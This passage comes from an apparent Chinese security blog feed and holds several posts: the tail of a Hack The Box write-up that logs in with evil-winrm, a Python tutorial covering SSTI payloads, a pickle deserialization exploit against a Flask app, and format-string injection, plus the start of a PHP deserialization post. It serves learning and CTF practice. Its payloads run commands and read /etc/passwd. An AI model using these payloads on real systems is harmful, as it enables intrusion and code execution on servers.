WinRM服务，并尝试获取会话。由于默认情况下 Linux 上未安装 PowerShell，因此使用 <strong>Evil-WinRM</strong> ：</p><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.234</span> -u administrator -<span class="hljs-selector-tag">p</span> badminton<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213203019.png"></p><p>最终找到flag（windows cmd.exe 用dir 查看当前文件夹下的内容，type 查看文件内容）：</p><p><img src="/../images/Pasted%20image%2020241213202816.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这是 Hack The Box 新手关卡第二阶段的第四关，明显感觉很吃力，不过收获颇丰。通过这一关，我认识了三个渗透神器：Responder 、 John The Ripper 和 Evil-WinRM 。最重要的是，对文件包含漏洞的利用有了更加深刻的理解，即使 allow_url_include 开关没开，居然也有办法执行远程文件包含。不过以上整个渗透过程，如果现在单独再操作一遍，还是无法完成。目前能力欠佳，相信通过多刷题能力提升之后，就可以复现了。再次感慨这个平台做得真好。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;本篇博客演示了文件包含漏洞的利用，包括本地文件包含和远程文件</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Python安全</title>
    <link href="http://example.com/2024/12/11/Python%E5%AE%89%E5%85%A8/"/>
    <id>http://example.com/2024/12/11/Python%E5%AE%89%E5%85%A8/</id>
    <published>2024-12-11T11:26:54.000Z</published>
    <updated>2024-12-13T12:57:33.164Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h1><p>SSTI（Server Side Template Injection，服务器端模板注入）：服务端接收攻击者的输入，将其作为 Web 应用模板内容的一部分。在进行目标编译渲染的过程中，执行了所插入的恶意内容。从而导致信息泄露、代码执行、GetShell 等问题，其影响范围取决于模版引擎复杂性。</p><p>模板引擎和渲染函数本身是没有漏洞的，该漏洞产生原因在于模板可控引发代码注入，凡是使用模板的地方都可能会出现 SSTI 的问题。</p><p>不同模版引擎对应不同的解析符号：<br><img src="/../images/Pasted%20image%2020241211204556.png"></p><p>如何判断是否存在SSTI注入？</p><ul><li>提交的数据如果在页面中有显示，即可进行SSTI测试。</li><li>根据该模版引擎的解析符号，尝试注入简单的模板表达式，比如 <code>&#123;&#123; 7*7 &#125;&#125;</code>，观察页面是否直接返回表达式结果。</li><li>正常情况下，用户输入应当被视为普通文本，不应执行其中的任何代码。如果输入 <code>&#123;&#123; 7*7 &#125;&#125;</code> 被解析为 <code>49</code>，说明服务器将输入当成了代码，而不是普通文本，就说明该页面存在 SSTI 注入。</li></ul><p>自动化工具：<a href="https://github.com/vladko312/SSTImap">https://github.com/vladko312/SSTImap</a></p><h2 id="Python对象的魔术方法"><a href="#Python对象的魔术方法" class="headerlink" title="Python对象的魔术方法"></a>Python对象的魔术方法</h2><figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__class__</span>：类的一个内置属性，表示实例对象的类。<br><br><span class="hljs-emphasis">__base__</span>：类型对象的直接基类。<br><br><span class="hljs-emphasis">__bases__</span>：类型对象的全部基类，以元组形式，类型的实例通常没有属性 。<br><br><span class="hljs-emphasis">__mro__</span> ：解析方法调用的顺序；此属性是由类组成的元组，在方法解析期间会基于它来查找基类。<br><br><span class="hljs-emphasis">__subclasses__</span>()：返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。<br><br><span class="hljs-emphasis">__init__</span>：初始化类，返回的类型是function。<br><br><span class="hljs-emphasis">__globals__</span>：使用方式是 函数名.<span class="hljs-emphasis">__globals__</span>获取function所处空间下可使用的module、方法以及所有变量。<br><br><span class="hljs-emphasis">__dic__</span>：类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="hljs-emphasis">__dict__</span>里。<br><br><span class="hljs-emphasis">__getattribute__</span>()：实例、类、函数都具有的<span class="hljs-emphasis">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用<span class="hljs-emphasis">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br><br><span class="hljs-emphasis">__getitem__</span>()：调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="hljs-emphasis">&#x27;b&#x27;</span>]，就是a.<span class="hljs-emphasis">__getitem__</span>(<span class="hljs-emphasis">&#x27;b&#x27;</span>)<br><br><span class="hljs-emphasis">__builtins__</span> ：内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<br><br><span class="hljs-emphasis">__import__</span> ：动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-emphasis">__import__</span>(<span class="hljs-emphasis">&#x27;os&#x27;</span>).popen(<span class="hljs-emphasis">&#x27;ls&#x27;</span>).read()]<br><br><span class="hljs-emphasis">__str__</span>()：返回描写这个对象的字符串，可以理解成就是打印出来。<br></code></pre></td></tr></table></figure><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p>下面的语句均拼接到模板渲染的接收参数处。</p><ol><li>查看当前环境中哪些子类可用。</li></ol><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241211212759.png"></p><ol start="2"><li>查找利用类索引。</li></ol><p>开启vscode的正则表达式模式，把逗号替换成\n，方便查看。找到利用类的索引，如</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><code class="hljs actionscript">&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>索引从 0 开始排序，根据环境不同，索引也不同，所以需要实际情况分析。</p><p>该类的索引是144：<br><img src="/../images/Pasted%20image%2020241211213043.png"></p><ol start="3"><li>查看该类所处空间下可使用的所有变量。</li></ol><figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">144</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241211213808.png"></p><ol start="4"><li>构造利用类方法。</li></ol><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[144].__init__.__globals__.popen(<span class="hljs-name">&#x27;calc&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>显示没有这个属性：</p><p><img src="/../images/2be29370c82470255945ff4c2273df1b.png"></p><p>失败原因是Python 3.8 及以上，<code>dict</code> 明确不支持通过点号访问键，强制使用 <code>[&#39;key&#39;]</code> 的方式。</p><p>于是尝试改为以下格式：</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[133].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;calc&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>成功打开计算器：</p><p><img src="/../images/Pasted%20image%2020241211222236.png"></p><p>若是读取文件，要用 popen 命令，不能用system。因为 os.system 只是执行，无回显。而 popen 自带读取函数 read，可以得到执行命令的结果进行回显。</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[144].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h2><figure class="highlight prolog"><table><tr><td class="code"><pre><code class="hljs prolog">//获得基类:<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>] # python3<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">2</span>] # python2<br>&#123;&#125;.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>] ().<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>] [].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>] request.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>]<br>request.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>]<br><br>//文件操作 <br>//python3 已经移除了file。所以利用 file 子类文件读取只能在 python2 中用。<br>//找到file类 :<br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">40</span>] <br>//读文件 :<br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() <br>//写文件 :<br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/tmp&#x27;</span>).write(<span class="hljs-string">&#x27;test&#x27;</span>)<br><br>//命令执行 <br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">144</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) <br><br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">144</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园</a></p><p><a href="https://www.suyou.world/index.php/2024/01/22/%e7%ac%ac70%e5%a4%a9%ef%bc%9aweb%e6%94%bb%e9%98%b2-python%e5%ae%89%e5%85%a8ssti%e6%a8%a1%e7%89%88%e6%b3%a8%e5%85%a5jinja2%e5%bc%95%e6%93%8e%e5%88%a9%e7%94%a8%e7%bb%95%e8%bf%87%e9%a1%b9%e7%9b%ae/">第70天：WEB攻防-Python安全&amp;SSTI模版注入&amp;Jinja2引擎&amp;利用绕过项目&amp;黑盒检测 – The-Starry-Sky</a></p><h2 id="实例分析-NewStar-CTF-2024-Week2-Web-复读机"><a href="#实例分析-NewStar-CTF-2024-Week2-Web-复读机" class="headerlink" title="实例分析-NewStar-CTF-2024-Week2-Web-复读机"></a>实例分析-NewStar-CTF-2024-Week2-Web-复读机</h2><ol><li>确定注入点是否存在 SSTI。</li></ol><p>输入 <code>&#123;&#123; 7*7 &#125;&#125;</code> 被解析为 <code>49</code>，说明服务器将输入当成了代码，而不是普通文本，就说明该页面存在 SSTI 注入。</p><ol start="2"><li>探索过滤规则。</li></ol><p>尝试注入 <code>&#123;&#123; "a".__class__&#125;&#125;</code> 来获取当前对象的类。页面输出异常信息（“bot 显示不喜欢上课”），说明 <code>__class__</code> 被过滤，<code>.</code> 可能也会被视为敏感字符，因为它能直接访问对象的属性。</p><p>遇到关键字被过滤的情况，可以利用字符串拼接等技巧绕过过滤，例如 <code>&#123;&#123;"a"['__cl'+'ass__']&#125;&#125;</code>，绕过 <code>__class__</code> 关键字限制。其中用<code>[]</code> 来绕过<code>.</code>过滤<br><img src="/../images/Pasted%20image%2020241029221640.png"><br>3. 利用 SSTI 获取敏感对象和方法。</p><p>SSTI 的目的是执行服务端代码，所以我们需要找到一个能操作系统命令的类。</p><p>对于大多数语言，<code>object</code> 是所有类的基类，我们可以通过访问 <code>object</code> 来找到各种可能的类。</p><p>可以通过表达式 <code>&#123;&#123;"a".['__cl'+'ass__']['__mro__'][1]&#125;&#125;</code>获取 <code>object</code> 类；<br><img src="/../images/Pasted%20image%2020241029222218.png"><br>然后通过 <code>&#123;&#123;"a".['__cl'+'ass__']['__mro__'][1]['__subc'+'lasses__']()&#125;&#125;</code> 获得所有子类的列表。</p><p><img src="/../images/Pasted%20image%2020241029222419.png"></p><ol start="4"><li>查找可利用的类。</li></ol><p>在获得 <code>subclasses()</code> 列表后，可以遍历其中的类，找到可能用于执行命令的类。在这个例子中，可以选择 <code>os._wrap_close</code>（通常位于索引 132，不同的 Python 版本和环境中，索引值可能有所不同）类。</p><p><code>os._wrap_close</code> 类中包含了可以帮助调用系统命令的方法，比如 <code>__init__</code> 中可以访问 <code>__globals__</code> 属性，进一步获取 Python 内置的 <code>eval</code> 函数。</p><ol start="5"><li>利用 <code>eval</code> 执行系统命令</li></ol><p>构造命令执行的表达式：</p><figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss">&#123;&#123;&quot;<span class="hljs-selector-tag">a</span>&quot;.<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__mro__&#x27;</span>]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subc&#x27;</span>+<span class="hljs-string">&#x27;lasses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[132]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__init__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__globals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(&quot;__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.popen</span>(&#x27;cat /flag&#x27;)<span class="hljs-selector-class">.read</span>()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241029223458.png"></p><h1 id="Python-反序列化漏洞"><a href="#Python-反序列化漏洞" class="headerlink" title="Python 反序列化漏洞"></a>Python 反序列化漏洞</h1><h2 id="python-常用-反-序列化函数"><a href="#python-常用-反-序列化函数" class="headerlink" title="python 常用 (反) 序列化函数"></a>python 常用 (反) 序列化函数</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">pickle<span class="hljs-selector-class">.dump</span> (obj, file) : 将对象序列化后保存到文件<br>pickle<span class="hljs-selector-class">.load</span> (file) : 将文件序列化内容反序列化为对象<br>pickle<span class="hljs-selector-class">.dumps</span> (obj) : 将对象序列化成字符串格式的字节流<br>pickle<span class="hljs-selector-class">.loads</span> (bytes_obj) : 将字符串字节流反序列化为对象<br>PyYAML yaml<span class="hljs-selector-class">.load</span>()<br>JSON json<span class="hljs-selector-class">.loads</span>(s)<br>marshal<br></code></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight erlang"><table><tr><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">reduce</span> <span class="hljs-params">()</span>：反序列化时调用。</span><br><span class="hljs-function"><span class="hljs-title">reduce_ex</span> <span class="hljs-params">()</span> ：反序列化时调用，同时都有的时候，执行 <span class="hljs-title">reduce_ex</span> ，不执行 <span class="hljs-title">reduce</span>。</span><br><span class="hljs-function"><span class="hljs-title">setstate</span> <span class="hljs-params">()</span> ：反序列化时调用（类似于 <span class="hljs-title">php</span> 的 <span class="hljs-title">isset</span> ）。</span><br><span class="hljs-function"><span class="hljs-title">getstate</span> <span class="hljs-params">()</span> ：序列化时调用。</span><br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"> import pickle<br> import base64<br> <span class="hljs-keyword">from</span> flask import Flask, request<br> app = Flask(__name__)<br> ​<br> @app.route(<span class="hljs-string">&quot;/&quot;</span>)<br> def index():<br>     try:<br>        <span class="hljs-built_in"> user </span>= base64.b64decode(request.cookies.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;user&#x27;</span>))<br>        <span class="hljs-built_in"> user </span>= pickle.loads(user) #反序列化<br>         return <span class="hljs-string">&quot;Hello %s&quot;</span> %<span class="hljs-built_in"> user</span><br><span class="hljs-built_in"></span>     except:<br>         username = <span class="hljs-string">&quot;Guest&quot;</span><br>         return <span class="hljs-string">&quot;Hello %s&quot;</span> % username<br> ​<br> ​<br> <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>     app.<span class="hljs-built_in">run</span>(<br>         <span class="hljs-attribute">host</span>=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<br>         <span class="hljs-attribute">port</span>=5000,<br>         <span class="hljs-attribute">debug</span>=<span class="hljs-literal">True</span><br>    )<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"> <span class="hljs-keyword">import</span> requests<br> <span class="hljs-keyword">import</span> pickle<br> <span class="hljs-keyword">import</span> os<br> <span class="hljs-keyword">import</span> base64<br> ​<br> <span class="hljs-keyword">class</span> exp(<span class="hljs-keyword">object</span>):<br>     def __reduce__(self):<br>         <span class="hljs-keyword">return</span> (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;,))<br> ​<br> ​<br> e = exp()<br> s = pickle.dumps(e)<br> <span class="hljs-keyword">user</span>=base64.b64encode(s).decode()<br> print(<span class="hljs-keyword">user</span>)<br> response = requests.<span class="hljs-keyword">get</span>(&quot;http://127.0.0.1:5000/&quot;, cookies=dict(<span class="hljs-keyword">user</span>=base64.b64encode(s).decode()))<br></code></pre></td></tr></table></figure><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p><a href="https://xz.aliyun.com/t/3569?time__1311=n4+xnii=G=DQoiKDtbDs63xCq7KtYvNUKA00Qx">Python Web之flask session&amp;格式化字符串漏洞 - 先知社区</a></p><p>在 python 中，提供了 4 种格式化字符串方式。</p><ol><li><strong>%操作符</strong></li></ol><p>沿袭C语言中printf语句的风格：</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">name = <span class="hljs-string">&#x27;Bob&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;Hello, %s&#x27;</span> % name</span><br>&quot;Hello, Bob&quot;<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>string.Template</strong></li></ol><p>使用标准库中的模板字符串类进行字符串格式化：</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">name = <span class="hljs-string">&#x27;Bob&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> Template</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">t = Template(<span class="hljs-string">&#x27;Hey, $name!&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">t.substitute(name=name)</span><br>&#x27;Hey, Bob!&#x27;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>调用format方法</strong></li></ol><p>python3后引入的新版格式化字符串写法：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">&gt;&gt;&gt; <span class="hljs-type">name</span> , errno = <span class="hljs-string">&#x27;Bob&#x27;</span> , <span class="hljs-number">50159747054</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;Hello, &#123;&#125;&#x27;</span>.format(<span class="hljs-type">name</span>)<br><span class="hljs-string">&#x27;Hello, Bob&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;Hey &#123;name&#125;, there is a 0x&#123;errno:x&#125; error!&#x27;</span>.format(<span class="hljs-type">name</span>=<span class="hljs-type">name</span>, errno=errno)<br><span class="hljs-string">&#x27;Hey Bob, there is a 0xbadc0ffee error!&#x27;</span><br></code></pre></td></tr></table></figure><p>但是这种写法存在安全隐患：</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">config = &#123;<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-string">&#x27;12345&#x27;</span>&#125;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"> <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">  <span class="hljs-variable language_">self</span>.name = name</span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">user = User(<span class="hljs-string">&#x27;joe&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;&#123;0.__class__.__init__.__globals__[config]&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(user)</span><br>&quot;&#123;&#x27;SECRET_KEY&#x27;: &#x27;12345&#x27;&#125;&quot;<br></code></pre></td></tr></table></figure><p>如果用来格式化的字符串可以被控制，攻击者就可以通过注入特殊变量，带出敏感数据。</p><ol start="4"><li><strong>f-Strings</strong></li></ol><p>这是python3.6之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的python表达式，安全隐患可想而知。</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a , b = <span class="hljs-number">5</span> , <span class="hljs-number">10</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">f&#x27;Five plus ten is <span class="hljs-subst">&#123;a + b&#125;</span> and not <span class="hljs-subst">&#123;<span class="hljs-number">2</span> * (a + b)&#125;</span>.&#x27;</span></span><br>&#x27;Five plus ten is 15 and not 30.&#x27;<br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;id&quot;</span>)&#125;</span>&#x27;</span></span><br>uid=0(root) gid=0(root) groups=0(root)<br>&#x27;0&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSTI注入&quot;&gt;&lt;a href=&quot;#SSTI注入&quot; class=&quot;headerlink&quot; title=&quot;SSTI注入&quot;&gt;&lt;/a&gt;SSTI注入&lt;/h1&gt;&lt;p&gt;SSTI（Server Side Template Injection，服务器端模板注入）：服务端接收攻击者</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="http://example.com/2024/12/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-10T07:50:36.000Z</published>
    <updated>2024-12-11T05:42:17.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>在面向对象的程序设计中，<strong>类</strong>和<strong>对象</strong>是两个非常重要的概念。类是创建对象的基础，包含了对象的结构和功能。对象是类的实例，它拥有类中定义的属性和方法。</p><p>以下是一个PHP类：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span> //定义一个类</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">//一个变量</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;This is a string&#x27;</span>;<br><span class="hljs-comment">//一个方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintVariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable;<br>&#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>();<br><span class="hljs-comment">//调用一个方法</span><br><span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">PrintVariable</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PHP 对属性或方法的访问控制，是通过在前面添加关键字实现的。</p><ul><li>public：公有的类成员可以在任何地方被访问。</li><li>protected：受保护的类成员只能被其自身以及其父类和子类访问。</li><li>private：私有的类成员只能被其定义所在的类访问</li></ul><p>访问控制修饰符不同，序列化后属性的长度和属性值会有所不同，如下所示：</p><ul><li>public：属性值会变成属性名。</li><li>protected：属性值会变成 <code>\x00*\x00属性名</code></li><li>private：属性值会变成 <code>\x00类名\x00属性名</code><br>其中：\x00表示空格。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$gender</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;Hardworking666&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;gender = <span class="hljs-string">&#x27;male&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-string">&#x27;18&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;People&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Hardworking666&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot; * gender&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;male&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot; People age&quot;</span>;s:<span 